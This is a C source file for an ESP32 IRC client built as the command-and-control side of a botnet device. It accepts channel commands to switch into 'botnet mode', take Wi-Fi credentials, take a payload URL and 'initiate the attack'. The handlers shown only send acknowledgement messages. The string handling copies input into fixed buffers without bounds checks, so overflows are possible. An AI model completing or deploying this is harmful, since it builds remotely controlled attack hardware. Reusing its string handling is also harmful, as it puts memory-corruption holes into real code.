#include <string.h>
#include "sdkconfig.h"
#include "esp_timer.h"

extern void connect_to_server(void);

extern void send_command(char *payload);

extern void receive_response(char *rx_buffer, size_t n);

extern void close_socket(void);

#if defined(CONFIG_IRC_CHANNEL)
const char channel_name[] = CONFIG_IRC_CHANNEL;
#endif

#if defined(CONFIG_IRC_SERVER)
const char server_name[] = CONFIG_IRC_SERVER;
#endif

int received_history = 0;
esp_timer_handle_t history_timer;

void send_nick(char *username) {
    char request[50] = "";
    strcat(request, "NICK ");
    strcat(request, username);
    strcat(request, "\r\n");
    send_command(request);
}

void send_user(char *username) {
    char request[50] = "";
    strcat(request, "USER ");
    strcat(request, username);
    strcat(request, " * * :");
    strcat(request, username);
    strcat(request, "\r\n");
    send_command(request);
}

void register_user(void) {
    int success = 0;
#if defined(CONFIG_IRC_USERNAME)
    char username[] = CONFIG_IRC_USERNAME;
#endif
    while (!success) {
        char rx_buffer[500];
        send_nick(username);
        send_user(username);
        receive_response(rx_buffer, sizeof(rx_buffer));
        if (strstr(rx_buffer, "433")) {
            char new_username[100] = "_";
            strcat(new_username, username);
            strcpy(username,new_username);
        } else {
            success = 1;
        }
    }
}

void join_channel(void)
{
    char request[50] = "JOIN ";
    strcat(request, channel_name);
    strcat(request, "\r\n");
    send_command(request);
}

void send_pong(void) {
    char request[50] = "";
    strcat(request, "PONG ");
    strcat(request, server_name);
    strcat(request, "\r\n");
    send_command(request);
}

void send_message(char *message) {
    char request[200] = "PRIVMSG ";
    strcat(request, channel_name);
    strcat(request, " :");
    strcat(request, message);
    strcat(request, "\r\n");
    send_command(request);
}

static void history_timer_callback(void* arg)
{
    received_history = 1;
    send_message("Initialization over, ready for commands...");
}

void init_timer(void) {
    send_message("Initializing device...");

    const esp_timer_create_args_t history_timer_args = {
            .callback = &history_timer_callback,
            .name = "history_timer"
    };
    ESP_ERROR_CHECK(esp_timer_create(&history_timer_args, &history_timer));
    ESP_ERROR_CHECK(esp_timer_start_once(history_timer, 5000000));
}

void send_help(void) {
    send_message("MODE,<[AUTO,BOT]> - change between autonomous and botnet mode");
    send_message("WIFI,<SSID>,<PASS> - send wifi credentials");
    send_message("PAYLOAD,<URL> - send url of the payload");
    send_message("INIT - initiate the payload");
    send_message("IRC_DISCONN - disconnect from server");
    send_message("TERMINATE - terminate the device");
}

void handle_messages(void) {
    init_timer();

    char rx_buffer[500];
    while (1) {
        receive_response(rx_buffer, sizeof(rx_buffer));
        if (strstr(rx_buffer, "PING")) {
            send_pong();
        } else if (received_history && strstr(rx_buffer, "PRIVMSG")) {
            if(strstr(rx_buffer, ":HELP")) {
                send_help();
            } else if (strstr(rx_buffer, ":MODE,AUTO")){
                send_message("Switching to autonomous mode!");
            } else if (strstr(rx_buffer, ":MODE,BOT")){
                send_message("Switching to botnet mode!");
            } else if (strstr(rx_buffer, ":IRC_DISCONN")){
                send_message("Disconnecting from server!");
                return;
            }  else if (strstr(rx_buffer, ":TERMINATE")){
                send_message("Terminating device!");
                return;
            } else if (strstr(rx_buffer, ":WIFI,")) {
                send_message("Received new wifi credentials, connecting...");
            } else if (strstr(rx_buffer, ":PAYLOAD,")) {
                send_message("Received new payload, downloading...");
            } else if (strstr(rx_buffer, ":INIT")) {
                send_message("Initiating attack!");
            } else {
                send_message("Unknown command received! Type HELP for list of commands");
            }
        }
    }
}

void disconnect(void){
    send_command("QUIT\r\n");
    ESP_ERROR_CHECK(esp_timer_delete(history_timer));
}

void irc_client(void) {
    connect_to_server();
    register_user();
    join_channel();
    handle_messages();
    disconnect();
    close_socket();
}